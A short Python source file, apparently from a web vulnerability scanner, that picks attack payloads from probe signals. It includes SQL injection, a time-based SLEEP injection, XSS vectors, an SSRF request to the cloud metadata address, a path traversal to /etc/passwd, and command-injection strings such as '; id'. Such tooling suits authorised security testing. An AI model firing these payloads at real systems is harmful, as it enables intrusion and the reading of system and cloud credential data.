
class PayloadMutator:
    """
    Generates targeted payloads based on signals detected from probes.
    """
    
    def mutate(self, vuln_type: str, signals: dict) -> list:
        payloads = []
        
        if vuln_type == "SQLi":
            if signals.get("error_detected"):
                payloads.append("' OR '1'='1")
            if signals.get("behavior_change"):
                payloads.append("1 OR 1=1")
            if signals.get("latency_shift"):
                payloads.append("1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--")
                
        elif vuln_type == "XSS":
            if signals.get("reflection"):
                payloads.append("\"><svg/onload=alert(1)>")
                payloads.append("'%2balert(1)%2b'")
                
        elif vuln_type == "SSRF":
            if signals.get("behavior_change"):
                payloads.append("http://169.254.169.254/latest/meta-data/")
                
        elif vuln_type == "LFI":
            if signals.get("reflection") or signals.get("behavior_change"):
                payloads.append("../../../../../../../../etc/passwd")
                
        elif vuln_type == "RCE":
            if signals.get("latency_shift") or signals.get("behavior_change"):
                payloads.append("; id")
                payloads.append("| whoami")

        return payloads[:3] # Limit to 3 mutations

mutator = PayloadMutator()
